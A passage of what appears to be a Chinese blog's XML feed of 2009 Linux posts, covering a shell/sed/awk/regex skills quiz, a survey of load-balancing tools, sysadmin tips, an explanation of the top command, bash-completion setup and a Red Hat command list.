href="http://www.good.com/awstats.pl来查看那些人访问了你的网站。。。。" target="_blank" rel="noopener">http://www.good.com/awstats.pl来查看那些人访问了你的网站。。。。</a></p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>SHELL 综合水平测试</title>
      <link href="/2009/12/22/shell-comprehensive-level-testing/"/>
      <url>/2009/12/22/shell-comprehensive-level-testing/</url>
      <content type="html"><![CDATA[<p>按：SHELL 水平测试系列并非覆盖 SHELL 的所有方面，而是挑选一些题目以引发思考，<br>以管中窥豹的方式达到检验水平的目的．  </p><p>希望回答问题时不是简单地 Yes or No. 而是写出解决方案。<br>很多问题在不同的 shell 或 工具之间表现不同， 请列出不同之处  </p><p>[ SHELL 水平测试 ][ OVERVIEW 篇 ]  </p><p>1. 有很多种 shell, 你熟悉几种？ 各个 shell 的 home page 在那里？  </p><p>2. 为什么说 zsh 是目前为止功能最为强大的 shell.  </p><p>3. 为什么说 pdksh 功能较弱？  </p><p>4. ksh88 与 ksh93 有何区别？  </p><p>5. 为什么 shell 编程最好用 ksh?  </p><p>6. 你的系统都有哪些 shell? 版本是多少？  </p><p>7. 你知道 POSIX 吗？最新版本是多少？和你的 shell 有什么关系？  </p><p>8. /sbin/sh 和 /bin/sh 有何区别？  </p><p>9. 你分析过 1000　行以上的 shell 程序吗？  </p><p>10. 各种 shell 的变量名长度有何限制？  </p><p>11. 各种 shell 的 array size 有何限制？  </p><p>12. FIFO 比 co-process　有什么优点？  </p><p>13. (..)　产生的 subshell 与调用另一个脚本产生的 subshell 有何不同？  </p><p>14. shell 中的函数可以递归吗？设计时要注意什么？  </p><p>15. 如何用 subshell 产生的多个值改变多个 shell 中的变量？  </p><p>16. File pattern 与 regular expression 有什么不同？  </p><p>17. shell 中含有大量文档．不想在每行之前用 # 注释．　有那两种方法可以实现？  </p><p>18. 用 shell 程序安装配置一个二进制可执行软件．希望将被安装软件含在 shell 程序中形成一个<br>　　安装文件，　可以吗？  </p><p>19. 可以在一个shell 程序里包含 ksh 及 perl　两种代码吗？  </p><p>20. 如何保证 shell 程序只有单一 instance 运行？　(有难度, 绝非一个 ps 命令可以搞定）  </p><p>21. 当有同名的 alias, function, builtin command, external command 时，如何知道并控制其运行顺序？  </p><p>22. 如何在自定义 function　中调用同名的　builtin command ?  </p><p>23. 怎样运行各种 shell 时具有 login shell 的行为?  </p><p>24. 为何 ksh, rksh, pfksh 都是同一个 hard link? 功能却不同？  </p><p>25. 当 while read .. 这样的语句用于 pipe　右侧时，需注意什么？  </p><p>26. 对于多个相连的 pipe，最后的返回码是 pipe 中那个命令的？　如何取得所有命令的返回码？  </p><p>27. cmd  &gt;a  2&gt;a 和 cmd  &gt;a  2&gt;&amp;1　为什么不同？  </p><p>28. Stdin, Stderr 可以关闭吗? 有什么结果?  </p><p>29. GNU tools 与其他 Unix 上的相比有什么特点？　为什么说不能过分依赖 GNU　扩展？  </p><p>30. VI　及 VIM 对行长度及 file size 有什么限制？  </p><p>31. 请写出对 field 1　(数字)，　field 3 (数字倒序)，　field 3 (ascii) 进行排序的完整语句．  </p><p>32. 如何用 diff　及其他工具写一个版本控制系统？（要有　check　in, check　out, file lock ..　等功能）  </p><p>[ SHELL 水平测试 ][ SED 篇 ]  </p><p>1. 你能看懂　sed one-lines 中的每一条语句吗？  </p><p>2. /regex/! command 与 /regex/ !command 有什么区别？  </p><p>3. 你能熟练使用 N,n, P,p,D,d,H,h,G,g,x,:,b,t 吗？  </p><p>4. 什么是 sed 高级编程中的 lookup table 技术  </p><p>5. sed debuger 的原理是什么？  </p><p>6. 为什么 sed 的 guru 和 fans 比 awk 的多．(请看 yahoo groups)  </p><p>下面几题根据使用的技术，难度不同．（难度 最小:１,最大:５)  </p><p>7. 将数据文件中的每个词的第一个字母变成大写．　(难度: 2 - 4)  </p><p>8. 在 sed 中实现记数器．可加　1 或减　1. (难度: 3 - 4)  </p><p>9. 提取 html 文件中 table 中每个单员的内容(table 可嵌套）．(难度: 4 - 5)  </p><p>每一个 cell　做为一个单员输出：  </p><p>Table #１, Row #1, Column #1  </p><p>Contents …….  </p><p>Table #１, Row #1, Column #2  </p><p>Contents …….  </p><p>10. 一般的 sed 的 regex 的匹配都是 greedy 的。如何用 sed 实现 lazy 匹配?  </p><p>[ SHELL 水平测试 ][ AWK 篇 ]  </p><p>注: 很多题目在不同的 awk 中实现不同, 请注明每一种 awk 的方法.  </p><p>1. awk, oawk, nawk, gawk, mawk 有什么区别？  </p><p>2. 在一个 awk 文件中,  第一行可以如下吗?  </p><p>#! /bin/awk -F: -f  </p><p>3. awk -F”” 与 awk -F “” 有区别吗?  </p><p>4. 可以这样设置 FS 吗?    </p><p>   FS = “[     ]+|[     ]+”  </p><p>5. gawk 有一个扩展表达式与其他 GNU 工具不同, 是哪个, 为什么?  </p><p>6. 那两种方法可以实现大小写无关匹配?  </p><p>7. 下列两句有何区别?  </p><p>awk ‘$0 ~ “[      ]”‘<br>awk ‘$0 ~ /[      ]/‘  </p><p>8. FS=” “ 和 FS=” +” 有何区别?  </p><p>9. 如何将每一个字符作为一个 field ?  </p><p>10. 如何将整个文件作为一个 field ?  </p><p>11. RS=”” 与 RS=” +” 有何区别?  </p><p>12. NR 和 FNR 有何区别?  </p><p>13. getline &lt; “file” 改变那些 builtin 变量?  </p><p>14. 如何不打印最后一个 field? (不用循环）  </p><p>15. $1 ~ /aaa/ 与 /aaa/ ~ $1 有何区别?  </p><p>16. a = /a/ 是什么意思?  </p><p>17. awk 中的 array 可以排序吗?  </p><p>18. 如何将 awk 中得到的值赋给 shell 变量.  </p><p>19. 如何模拟二维数组？  </p><p>20. 你的 awk 数组最多可能的单元是多少？有限制没有？  </p><p>21. 你的 awk 中 field number, record length 及　file size 有何限制？  </p><p>22. awk 中如何删除 array 及 关闭管道？  </p><p>23. 如何完成 rev 功能？  </p><p>24. 如何在 awk 中使用 coprocess？  </p><p>25. 你写过 100 行以上的 awk 程序吗？　  </p><p>[ SHELL 水平测试 ][ REGEX 篇 ]  </p><p>1. 传统 regex, POSIX regex, GNU regex, PCRE 都有什么特点及异同之处？  </p><p>2. ERE 是 BRE 的 super set 吗？  </p><p>3. ERE看起来强大，但使用 ERE 有一点最不爽, 是什么？  </p><p>4. 依赖 GNU 扩展的危害是什么？  </p><p>5. Back reference 可以嵌套吗？  </p><p>6. DFA 和 NFA 有什么特点及区别？  </p><p>7. 常用的 [e]grep, [ng]awk, [g]sed, perl 哪些是 DFA？　哪些是 NFA?　因此这些程序具有哪些相应的特点？  </p><p>8. Greedy regex　和 lazy regex　有何区别？　哪些工具是　lazy regex．  </p><p>9. 猜一猜一个符合 RFC 标准的 email adderss　大概需要多长的 regex 来匹配？  </p><p>10. 你是否有这样的经历： 某个使用过的 regex， 用在另个软件中却不行。<br>也就是说你无法确定某个 regex 在同一系统的不同软件中或在不同系统的相同软件中肯定能用?  </p><p>附加题  </p><p>1. 为什么说 CU 的整体较为业余, 但 shell 版的水平相对较高?  </p><p>2. 为什么 shell 版中的大部分高手都是玩 Linux 的, 而低手往往是 Sco unix, HP-UX 等其他平台的?  </p><p>3. 为什么当低手怯怯地抛出一个问题, 高手快速地给出了漂亮的解答, 却往往最后并没有解决低手的问题?</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>我所熟悉的网站负载均衡技术</title>
      <link href="/2009/12/22/i-am-familiar-with-load-balancing-technology/"/>
      <url>/2009/12/22/i-am-familiar-with-load-balancing-technology/</url>
      <content type="html"><![CDATA[<p><strong>DNS轮循</strong><br>　 　DNS轮循是指将相同的域名解释到不同的IP，随机使用其中某台主机的技术。但其具有明显的缺点：一旦某个服务器出现故障，即使及时修改了DNS设置， 还是要等待足够的时间（刷新时间）才能发挥作用，在此期间，保存了故障服务器地址的客户计算机将不能正常访问服务器。DNS负载均衡采用的是简单的轮循负 载算法，不能区分服务器的差异，不能反映服务器的当前运行状态，不能做到为性能较好的服务器多分配请求，甚至会出现客户请求集中在某一台服务器上的情况。  </p><p>　　<strong>F5 BIG-IP</strong><br><a href="http://blog.atop.fun/wp-content/uploads/netease/other_site/blog_s135_f5-big-ip.jpg" target="_blank" rel="noopener"><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/blog_s135_f5-big-ip.jpg" alt="点击在新窗口中浏览此图片" title="点击在新窗口中浏览此图片"></a>　　简介：F5 Networks 公司的著名硬件负载均衡交换机。支持硬件四层、七层交换。不同的型号性能不同，BIG-IP 6400可以支持800万条并发连接，低一点型号的可以支持400万条以上的并发连接。性能极高，但价格也不菲。<br>　　价格：BIG-IP 6400的价格在16万元人民币左右。<br>　　网址：<a href="http://www.f5.com.cn/" target="_blank" rel="noopener">http://www.f5.com.cn/</a>（中国） <a href="http://www.f5.com/" target="_blank" rel="noopener">http://www.f5.com/</a>（全球）  </p><p>　　<strong>LVS（Linux Virtual Server）</strong><br>　　简介：软件四层交换。LVS是在Linux内核中作四层交换，只花128个字节记录一个连接信息，不涉及到文件句柄操作，故没有65535最大文件句柄数的限制。LVS性能很高，可以支持100～400万条并发连接。<br>　　价格：免费、开源<br>　　网址：<a href="http://zh.linuxvirtualserver.org/" target="_blank" rel="noopener">http://zh.linuxvirtualserver.org/</a>  </p><p>　　<strong>L7SW（Layer7 switching）</strong><br>　 　简介：软件七层交换。这是一款类似LVS的新负载均衡软件，我没有实际应用过，性能未知，因此不作评价。这是它的英文介绍：Layer7 switching is driving a low-level engine using networking design to speed-up forwarding of data stream. Implementation in this project is split into a userspace daemon and a low-level kernelspace forwarding engine. Userspace daemon is responsible for scheduling and switching decisions. Kernelspace forwarding engine is responsible for forwarding stream and using TCP-Splicing scheme. TCP-Splicing is the postponement of the connection between the client and the server in order to obtain sufficient information to make a routing decision. This project is close to Linux Virtual Server project since lot of discusions on this topics have been made online and offline LVS project.<br>　　价格：免费、开源<br>　　网址：<a href="http://www.linux-l7sw.org/" target="_blank" rel="noopener">http://www.linux-l7sw.org/</a>  </p><p>　　<strong>HAProxy</strong><br>　 　简介：软件七层交换，反向代理服务器。目前还不支持虚拟主机，但其配置简单，拥有非常不错的服务器健康检查功能，当其代理的后端服务器出现故 障，HAProxy会自动将该服务器摘除，故障恢复后再自动将该服务器加入。另外，HAProxy还支持双机热备。我曾经用过一段时间，能支持2～3万条 并发连接。现在我用它做普通的小并发负载均衡，主要用到的是它的服务器健康检查功能。<br>　　价格：免费、开源<br>　　网址：<a href="http://haproxy.1wt.eu/" target="_blank" rel="noopener">http://haproxy.1wt.eu/</a>  </p><p>　　<strong>Nginx</strong><br>　　简介：软件七层交换，反向代理服务器。能够很好地支持虚拟主机，可配置性很强，可以按URL做负载均衡。我目前一直在用，大约能支持3～5万条并发连接。<br>　　价格：免费、开源<br>　　网址：<a href="http://wiki.codemongers.com/NginxChs" target="_blank" rel="noopener">http://wiki.codemongers.com/NginxChs</a>（中文维基）</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>其实Linux这样用更简单些</title>
      <link href="/2009/12/22/actually-it-s-easier-to-use-linux/"/>
      <url>/2009/12/22/actually-it-s-easier-to-use-linux/</url>
      <content type="html"><![CDATA[<p>最近发现公司的小孩儿们都开始学Linux了，可惜学的都是那些超级麻烦的命令，唉。 其实Linux这样用更简单些……</p><p>改IP，可以用 netconfig，可惜每次都得输入完整的IP、掩码、网关和DNS。 不如直接 vi /etc/sysconfig/network-scripts/ifcfg-eth0 再 /etc/init.d/network restart 来得快。</p><p>改DNS，最快的就是 vi /etc/resolv.conf，不用重启。</p><p>重启httpd，/etc/init.d/httpd restart 要比 service httpd restart快，因为前者可以补齐而后者不能。</p><p>修改系统服务，用chkconfig要比setup方便。</p><p>看最新的log，用 tail -f /var/log/xxx.log 比 vi /var/log/xxx.log 方便。 看不清的话就先 clear 再 tail -n 0 -f /var/log/xxx.log。</p><p>用好<a href="http://tech.idv2.com/2007/03/27/bash-history-summary/" target="_blank" rel="noopener">bash的历史记录</a>。</p><p>压缩解压缩别动不动就tar czvf/tar xzvf，要养成不用v的好习惯。文件多了要快上好几倍。</p><p>两台机器传文件，scp 要比samba方便。windows的话就装个cygwin，或者用PuTTY自带的pscp.exe也行。</p><p>测试网络连接，nc 192.168.1.10 80 要比 telnet 192.168.1.10 80 好用。</p><p>修改samba配置，直接修改 /etc/samba/smb.conf 要比图形界面方便。</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>top命令详解</title>
      <link href="/2009/12/22/top-command-details/"/>
      <url>/2009/12/22/top-command-details/</url>
      <content type="html"><![CDATA[<p>top命令是Linux下常用的性能分析工具，能够实时显示系统中各个进程的资源占用状况，类似于Windows的任务管理器。 下面详细介绍它的使用方法。  </p><h2 id="认识top的显示结果"><a href="#认识top的显示结果" class="headerlink" title="认识top的显示结果"></a>认识top的显示结果</h2><p>top命令的显示结果如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">top - 01:06:48 up  1:22,  1 user,  load average: 0.06, 0.60, 0.48  </span><br><span class="line">Tasks:  29 total,   1 running,  28 sleeping,   0 stopped,   0 zombie  </span><br><span class="line">Cpu(s):  0.3% us,  1.0% sy,  0.0% ni, 98.7% id,  0.0% wa,  0.0% hi,  0.0% si  </span><br><span class="line">Mem:    191272k total,   173656k used,    17616k free,    22052k buffers  </span><br><span class="line">Swap:   192772k total,        0k used,   192772k free,   123988k cached  </span><br><span class="line">  </span><br><span class="line">  PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND  </span><br><span class="line"> 1379 root      16   0  7976 2456 1980 S  0.7  1.3   0:11.03 sshd  </span><br><span class="line">14704 root      16   0  2128  980  796 R  0.7  0.5   0:02.72 top  </span><br><span class="line">    1 root      16   0  1992  632  544 S  0.0  0.3   0:00.90 init  </span><br><span class="line">    2 root      34  19     0    0    0 S  0.0  0.0   0:00.00 ksoftirqd/0  </span><br><span class="line">    3 root      RT   0     0    0    0 S  0.0  0.0   0:00.00 watchdog/0</span><br></pre></td></tr></table></figure></p><h3 id="统计信息区"><a href="#统计信息区" class="headerlink" title="统计信息区"></a>统计信息区</h3><p>前五行是系统整体的统计信息。第一行是任务队列信息，同 uptime 命令的执行结果。其内容如下：</p><p>01:06:48</p><p>当前时间</p><p>up 1:22</p><p>系统运行时间，格式为时:分</p><p>1 user</p><p>当前登录用户数</p><p>load average: 0.06, 0.60, 0.48</p><p>系统负载，即任务队列的平均长度。<br>三个数值分别为 1分钟、5分钟、15分钟前到现在的平均值。</p><p>第二、三行为进程和CPU的信息。当有多个CPU时，这些内容可能会超过两行。内容如下：</p><p>Tasks: 29 total</p><p>进程总数</p><p>1 running</p><p>正在运行的进程数</p><p>28 sleeping</p><p>睡眠的进程数</p><p>0 stopped</p><p>停止的进程数</p><p>0 zombie</p><p>僵尸进程数</p><p>Cpu(s): 0.3% us</p><p>用户空间占用CPU百分比</p><p>1.0% sy</p><p>内核空间占用CPU百分比</p><p>0.0% ni</p><p>用户进程空间内改变过优先级的进程占用CPU百分比</p><p>98.7% id</p><p>空闲CPU百分比</p><p>0.0% wa</p><p>等待输入输出的CPU时间百分比</p><p>0.0% hi</p><p>0.0% si</p><p>最后两行为内存信息。内容如下：</p><p>Mem: 191272k total</p><p>物理内存总量</p><p>173656k used</p><p>使用的物理内存总量</p><p>17616k free</p><p>空闲内存总量</p><p>22052k buffers</p><p>用作内核缓存的内存量</p><p>Swap: 192772k total</p><p>交换区总量</p><p>0k used</p><p>使用的交换区总量</p><p>192772k free</p><p>空闲交换区总量</p><p>123988k cached</p><p>缓冲的交换区总量。<br>内存中的内容被换出到交换区，而后又被换入到内存，但使用过的交换区尚未被覆盖，<br>该数值即为这些<strong>内容已存在于内存中</strong>的交换区的大小。<br>相应的内存再次被换出时可不必再对交换区写入。</p><h3 id="进程信息区"><a href="#进程信息区" class="headerlink" title="进程信息区"></a>进程信息区</h3><p>统计信息区域的下方显示了各个进程的详细信息。首先来认识一下各列的含义。</p><p>序号</p><p>列名</p><p>含义</p><p>a</p><p>PID</p><p>进程id</p><p>b</p><p>PPID</p><p>父进程id</p><p>c</p><p>RUSER</p><p>Real user name</p><p>d</p><p>UID</p><p>进程所有者的用户id</p><p>e</p><p>USER</p><p>进程所有者的用户名</p><p>f</p><p>GROUP</p><p>进程所有者的组名</p><p>g</p><p>TTY</p><p>启动进程的终端名。不是从终端启动的进程则显示为 ?</p><p>h</p><p>PR</p><p>优先级</p><p>i</p><p>NI</p><p>nice值。负值表示高优先级，正值表示低优先级</p><p>j</p><p>P</p><p>最后使用的CPU，仅在多CPU环境下有意义</p><p>k</p><p>%CPU</p><p>上次更新到现在的CPU时间占用百分比</p><p>l</p><p>TIME</p><p>进程使用的CPU时间总计，单位秒</p><p>m</p><p>TIME+</p><p>进程使用的CPU时间总计，单位1/100秒</p><p>n</p><p>%MEM</p><p>进程使用的<strong>物理内存</strong>百分比</p><p>o</p><p>VIRT</p><p>进程使用的虚拟内存总量，单位kb。VIRT=SWAP+RES</p><p>p</p><p>SWAP</p><p>进程使用的虚拟内存中，被换出的大小，单位kb。</p><p>q</p><p>RES</p><p>进程使用的、未被换出的物理内存大小，单位kb。RES=CODE+DATA</p><p>r</p><p>CODE</p><p>可执行代码占用的<strong>物理</strong>内存大小，单位kb</p><p>s</p><p>DATA</p><p>可执行代码以外的部分(数据段+栈)占用的<strong>物理</strong>内存大小，单位kb</p><p>t</p><p>SHR</p><p>共享内存大小，单位kb</p><p>u</p><p>nFLT</p><p>页面错误次数</p><p>v</p><p>nDRT</p><p>最后一次写入到现在，被修改过的页面数。</p><p>w</p><p>S</p><p>进程状态。<br><strong>D</strong>=不可中断的睡眠状态<br><strong>R</strong>=运行<br><strong>S</strong>=睡眠<br><strong>T</strong>=跟踪/停止<br><strong>Z</strong>=僵尸进程</p><p>x</p><p>COMMAND</p><p>命令名/命令行</p><p>y</p><p>WCHAN</p><p>若该进程在睡眠，则显示睡眠中的系统函数名</p><p>z</p><p>Flags</p><p>任务标志，参考 sched.h</p><p>默认情况下仅显示比较重要的 PID、USER、PR、NI、VIRT、RES、SHR、S、%CPU、%MEM、TIME+、COMMAND 列。可以通过下面的快捷键来更改显示内容。</p><h2 id="更改显示内容"><a href="#更改显示内容" class="headerlink" title="更改显示内容"></a>更改显示内容</h2><p>通过 <strong>f</strong> 键可以选择显示的内容。按 f 键之后会显示列的列表，按 a-z 即可显示或隐藏对应的列，最后按回车键确定。</p><p>按 <strong>o</strong> 键可以改变列的显示顺序。按小写的 a-z 可以将相应的列向右移动，而大写的 A-Z 可以将相应的列向左移动。最后按回车键确定。</p><p>按大写的 <strong>F</strong> 或 <strong>O</strong> 键，然后按 a-z 可以将进程按照相应的列进行排序。而大写的 <strong>R</strong> 键可以将当前的排序倒转。</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>bash-completion增强tab补全</title>
      <link href="/2009/12/22/bash-completion-enhanced-tab-completion/"/>
      <url>/2009/12/22/bash-completion-enhanced-tab-completion/</url>
      <content type="html"><![CDATA[<p>默 认情况下,在bash中按 TAB 可以自动补齐，但仅能自动补齐命令名和文件名。bash-2.05及以后的版本提供了自动补齐的编程接口，通过安装 bash-completion 来使用 TAB 键自动补齐几乎任何内容，包括参数、文件、目录甚至包名称等等。例如：（<tab>表示按TAB键）</tab></p><p>\$ rpm -<tab>    (自动补齐参数)<br>-F  -U  -V  -b  -e  -i  -q  -t<br>\$ man cat<tab>    (自动补齐manpage)<br>cat       catan     catanf    catanh    catanhf   catanhl   catanl    catch     catclose  catdic    catgets   catopen<br>$ tar xjvf <tab>   (补齐时仅显示tar.bz2文件)<br>gimp-2.2.13.tar.bz2  glib-2.12.3.tar.bz2</tab></tab></tab></p><p>最近的发行版一般都自带bash-completion包，如果你的bash没有这个功能，可以从<a href="http://freshmeat.net/projects/bashcompletion/" target="_blank" rel="noopener">这里</a>下载bash-completion包并安装。安装方法很简单，下载到的包中包含一个 bas-completion 文件，将其放在 /etc 下，然后编辑 /etc/bashrc，在 if [ “$PS1” ]; then 的判断中加入以下内容：</p><p>if [ “$PS1” ]; then<br>  …其他内容省略，加入以下内容<br>  # Run bash completion code<br>  if [ -r /etc/bash_completion ]; then<br>  # Source completion code.<br>    . /etc/bash_completion<br>  fi<br>fi</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>redhat linux命令大全</title>
      <link href="/2009/12/22/redhat-linux-command-large/"/>
      <url>/2009/12/22/redhat-linux-command-large/</url>
      <content type="html"><![CDATA[<p><strong>一. 启动,关机,登入,登出相关命令</strong>  </p><p><login> 登录  </login></p><p><logout> 登出  </logout></p><p><exit> 登出  </exit></p><p><shutdown> 停止系统  </shutdown></p><p><halt> 停止系统  </halt></p><p><reboot> 重启动  </reboot></p><p><poweroff> 切断电源  </poweroff></p><p><sync> 把内存里的内容写入磁盘  </sync></p><p><lilo> 安装lilo启动管理程序  </lilo></p><p><grub> 安装lilo启动管理程序</grub></p><p><strong>二. Shell相关命令</strong>  </p><p><chsh> 切换Shell  </chsh></p><p><history> 显示命令履历  </history></p><p><alias> 设置命令别名  </alias></p><p><unalias> 取消命令别名  </unalias></p><p><which> 显示命令所在位置  </which></p><p><type> 查询命令种类  </type></p><p><echo> 显示字符串或者变量内容  </echo></p><p><set> 设置/显示Shell变量  </set></p><p><printenv> 显示环境变量  </printenv></p><p><export> 设置环境变量  </export></p><p><env> 设置临时环境变量  </env></p><p><unset> 释放环境变量  </unset></p><p><setenv> 设置环境变量  </setenv></p><p><unsetenv> 释放环境变量  </unsetenv></p><p><source> 执行文件当中的命令  </p><p><man> 查询命令手册  </man></p><p><info> 查询超文本命令手册  </info></p><p><whatis> 显示命令简介  </whatis></p><p><apropos> 通过关键字查询手册</apropos></p><p><strong>三. 用户管理相关命令</strong>  </p><p><su> 切换到其他用户  </su></p><p><useradd> 追加用户  </useradd></p><p><adduser> 追加用户  </adduser></p><p><userdel> 删除用户  </userdel></p><p><usermod> 修改用户设置  </usermod></p><p><chfn> 修改用户私人信息  </chfn></p><p><groupadd> 追加组  </groupadd></p><p><groupdel> 删除组  </groupdel></p><p><groupmod> 修改组设置  </groupmod></p><p><passwd> 更改密码  </passwd></p><p><whoami> 显示用户名  </whoami></p><p><logname> 显示登录用户帐号  </logname></p><p><users> 显示所有登录用户信息  </users></p><p><who> 查询登录用户信息  </who></p><p><w> 查询登录用户信息  </w></p><p><id> 显示指定用户的ID信息  </id></p><p><groups> 显示指定用户的所属组  </groups></p><p><finger> 显示指定用户的个人信息  </finger></p><p><mesg> 开关与他人收发消息  </mesg></p><p><write> 给其他用户发消息  </write></p><p><wall> 给所有用户发消息  </wall></p><p><talk> 和其他用户聊天</talk></p><p><strong>四. 系统消息相关命令</strong>  </p><p><date> 显示/设置当前时间  </date></p><p><uptime> 显示系统运行时间  </uptime></p><p><arch> 显示机器的核心构架（如i386）  </arch></p><p><uname> 显示操作系统信息  </uname></p><p><tty> 显示终端名  </tty></p><p><last> 显示登录/登出在履历  </last></p><p><lastb> 显示非法登录信息  </lastb></p><p><dumpkeys> 显示当前键盘配置  </dumpkeys></p><p><loadkeys> 变更键盘配置  </loadkeys></p><p><df> 查询磁盘使用信息  </df></p><p><du> 查询磁盘使用信息  </du></p><p><dmesg> 显示系统启动消息  </dmesg></p><p><script> 保存输入输出到文件</p><p><strong>五. 文件操作相关命令</strong>  </p><p><ls> 显示文件列表  </p><p><tree> 显示目录树  </p><p><pwd> 显示当前路径  </p><p><cd> 更改当前路径  </p><p><pushd> 追加路径到目录堆栈  </p><p><popd> 从目录堆栈删除路径  </p><p><dirs> 显示目录堆栈的内容  </p><p><mkdir> 创建路径  </p><p><rmdir> 删除路径  </p><p><cp> 复制文件/目录  </p><p><rm> 删除文件/目录  </p><p><mv> 移动文件/目录，修改文件名  </p><p><chown> 更改文件/目录的所有者  </p><p><chgrp> 修改文件/目录的所有组  </p><p><chmod> 修改文件/目录的权限  </p><p><touch> 更改文件时间  </p><p><ln> 建立文件/目录链接  </p><p><find> 查找文件  </p><p><whereis> 显示文件存在的路径名  </p><p><file> 查询文件种类  </p><p><size> 查询文件大小</p><p><strong>六. 文件编辑相关命令</strong>  </p><p><cat> 显示文件内容  </p><p><tee> 输出到文件和屏幕  </p><p><more> 分屏显示文件内容  </p><p><less> 分屏显示文件内容  </p><p><head> 显示文件头部内容  </p><p><tail> 显示文件尾部内容  </p><p><fold> 折叠显示长行  </p><p><sort> 排列文件的行  </p><p><cmp> 比较文件内容  </p><p><diff> 显示文件差异  </p><p><nkf> 更改日语文件编码  </p><p><dd> 变更文件之后复制  </p><p><wc> 统计文本单词数，文件大小等  </p><p><split> 分割文件  </p><p><paste> 以行连接文件  </p><p><join> 以字段连接文件  </p><p><grep> 查询文字  </p><p><uniq> 过滤重复部分显示文件内容  </p><p><tr> 替换文字  </p><p><sed> 替换文字</p><p><strong>七. 压缩/解压缩相关命令</strong>  </p><p><ar> 压缩/解压缩文件  </p><p><tar> 压缩/解压缩文件  </p><p><compress> 压缩/解压缩文件  </p><p><uncompress> 解压缩  </p><p><gzip> 压缩/解压缩文件  </p><p><gunzip> 解压缩  </p><p><zcat> 显示压缩文件的内容  </p><p><lha> 压缩/解压缩文件  </p><p><uuencode> 把二进制文件编码为文本文件  </p><p><uudecode> 把经过编码的文本文件还原为二进制文件</p><p><strong>八. MS-DOS工具集[mtools]命令</strong>  </p><p><mdir> 显示文件列表  </p><p><mcd> 改变当前目录  </p><p><mmd> 新建目录  </p><p><mrd> 删除目录  </p><p><mdeltree> 删除目录树  </p><p><mcopy> 复制文件  </p><p><mdel> 删除文件  </p><p><mmove> 移动文件  </p><p><mren> 更改文件或目录名  </p><p><mattrib> 修改文件属性  </p><p><mtype> 显示文件内容  </p><p><mdu> 查询文件或目录大小  </p><p><minfo> 显示磁盘信息  </p><p><mformat> 以MS-DOS方式格式化磁盘  </p><p><mlabel> 设置磁盘标签</p><p><strong>九. 控制外部设备相关命令</strong>  </p><p><mount> mount上设备  </p><p><umount> 解除已经mount上的设备  </p><p><eject> 弹出（CD/DVD等）  </p><p><fdformat> 格式化软盘  </p><p><fdisk> 配置/显示硬盘分区  </p><p><mkfs> 格式化磁盘分区  </p><p><fsck> 检查/修复磁盘错误  </p><p><lpr> 打印到打印机  </p><p><lprm> 中断打印任务  </p><p><lpq> 显示打印任务的状态  </p><p><lpc> 管理/控制打印任务  </p><p><ifconfig> 显示/设定NIC配置</p><p><strong>十. 进程及任务管理相关命令</strong>  </p><p><ps> 显示正在运行的进程  </p><p><jobs> 显示后台运行任务  </p><p><fg> 把任务切换到前台  </p><p><bg> 把任务切换到后台  </p><p><kill> 中止进程或任务  </p><p><killall> 中止进程或任务  </p><p><wait> 等待进程或任务的结束  </p><p><at> 设置定时执行任务  </p><p><atq> 显示尚未执行的任务  </p><p><atrm> 删除定时执行任务  </p><p><batch> 在系统负荷减轻的时候执行任务  </p><p><nice> 改变优先度并执行任务  </p><p><nohup> 在后台执行任务，Logout之后也不退出  </p><p><sleep> 休眠一定的时间</p><p><strong>十一. 网络管理相关命令</strong>  </p><p><netstat> 显示当前网络连接状况  </p><p><route> 显示/设置路由  </p><p><host> 显示网络主机情况  </p><p><hostname> 显示/设置当前主机的名字  </p><p><ping> 确认和远程机器的连接情况  </p><p><traceroute> 显示路由信息  </p><p><rwho> 查询网上机器的登陆用户  </p><p><ruptime> 查询网上机器的系统运行时间  </p><p><rlogin> 登陆到远程机器  </p><p><telnet> 用telnet登陆到远程机器  </p><p><rsh> 给远程机器发送命令  </p><p><rcp> 在远程机器之间复制文件  </p><p><mail> 收取邮件  </p><p><sendmail> 发送邮件  </p><p><mailq> 确认邮件队列  </p><p><ftp> 用ftp传输文件</p><p><strong>十二. 其他命令</strong>  </p><p><cal> 显示日历  </p><p><clear> 清屏  </p><p><gcc> 编译C语言代码  </p><p><as> 汇编  </p><p><bc> 计算  </p><p><rpm> Redhat的包管理  </p><p><dpkg> Debian的包管理  </p><p><installpkg> Slackware的包安装（删除命令则是removepkg）  </p><p>&lt;XF86Setup,turboxfg,Xconfigurator&gt; 配置 X 服务器  </p><p><startx> 启动 X-Window 系统</p><p>附：组合命令<br>重定向，如<br>$ ls -l /bin &gt; ls-output<br>$ more ls-output</p><p>管道命令，如<br>$ cat file1 file2 | sort | uniq</p><p>经常被用于管道的命令<br>awk, fold, grep, head, nnkf, pr, sed, sort, tail, tee, tr, uniq, wc</p></script></p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>How to mount a xen image ?</title>
      <link href="/2009/12/22/how-to-mount-a-xen-image/"/>
      <url>/2009/12/22/how-to-mount-a-xen-image/</url>
